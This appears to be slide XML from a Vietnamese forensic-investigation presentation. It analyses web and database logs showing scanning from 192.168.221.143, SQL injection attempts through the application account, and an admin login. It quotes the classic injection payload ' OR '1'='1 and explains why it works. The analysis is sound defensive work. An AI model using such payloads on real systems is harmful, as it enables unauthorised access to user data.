        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="3715863"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507" name="Google Shape;507;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phân tích hành vi truy xuất dữ liệu:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="508" name="Google Shape;508;p46" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="509" name="Google Shape;509;p46"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1889050" y="2333300"/>
            <a:ext cx="8177591" cy="125878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513"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="514" name="Google Shape;514;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="2321850"/>
            <a:ext cx="10622100" cy="2418000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Phân tích access.log và error.log cho thấy hệ thông web đã bị truy cập bởi địa chỉ IP 192.168.221.143 với nhiều hành vi bất thường mang tính thăm dò và khai thác tứng ứng dụng web</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Dấu vết cho thấy đối tượng đã:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Thực hiện quét dịch vụ web bằng công cụ tự động: nhằm truy vấn các endpoint không tồn tại như /sdk, /HNAP1, /evox/about và nmaplowercheck </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Gửi các payload bất thường vào tham số ứng dụng</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Truy vấn thông tin cơ sở dữ liệu</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Cố gắng truy cập dữ liệu tài khoản người dùng</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Và sau đó thực hiện đăng nhập thành công vào khu vực quản trị</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100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Các hành vi này phù hợp với chuỗi tấn công ứng dụng web dẫn đến truy cập trái phép hệ thống</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="515" name="Google Shape;515;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="516" name="Google Shape;516;p47"/>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517" name="Google Shape;517;p47" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="2109800"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="518" name="Google Shape;518;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kết luận sơ bộ:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="519" name="Google Shape;519;p47" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381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523"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="524" name="Google Shape;524;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3965925"/>
            <a:ext cx="10622100" cy="1222200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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 Dấu vết: Các kết nối đều từ user là webuser@localhost trên database public_service.</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 Nhận định: Đây là tài khoản ứng dụng web, bị lợi dụng để thực hiện các truy vấn bất thường.</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 Kết luận sơ bộ: Hành vi tấn công xuất phát từ IP đã ghi nhận trong access.log (192.168.221.143), thông qua tài khoản ứng dụng.</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="525" name="Google Shape;525;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="485775"/>
            <a:ext cx="11581500" cy="51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6.3.2. Chi tiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - Phân </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>tích query.log: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="526" name="Google Shape;526;p48"/>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527" name="Google Shape;527;p48" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="322875" y="3625850"/>
            <a:ext cx="173849" cy="1562275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="528" name="Google Shape;528;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xác định nguồn tấn công: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="529" name="Google Shape;529;p48" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="530" name="Google Shape;530;p48"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1681425" y="2408850"/>
            <a:ext cx="8258175" cy="8001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534"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="535" name="Google Shape;535;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="4445325"/>
            <a:ext cx="10622100" cy="2287500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t> Dấu hiệu kỹ thuật:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Payload: ' OR '1'='1 =&gt; Là payload injection cổ điển</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Ý nghĩa: Điều kiện: '1'='1' : luôn đúng -&gt; truy vấn trả về toàn bộ dữ liệu bảng</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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 Nhận định điều tra: Tại thời điểm này có thể kết luận:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Đối tượng đã thử bypass điều kiện truy vấn</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 Ứng dụng không lọc input đúng cách</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 SQL Injection có khả năng tồn tại.</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="536" name="Google Shape;536;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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6.3.2. Chi tiết - Phân tích query.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="537" name="Google Shape;537;p49"/>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538" name="Google Shape;538;p49" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="328700" y="4164975"/>
            <a:ext cx="192699" cy="2567850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="539" name="Google Shape;539;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giai đoạn dò tìm SQL Injection</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="540" name="Google Shape;540;p49" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="541" name="Google Shape;541;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="8475300" cy="5088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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
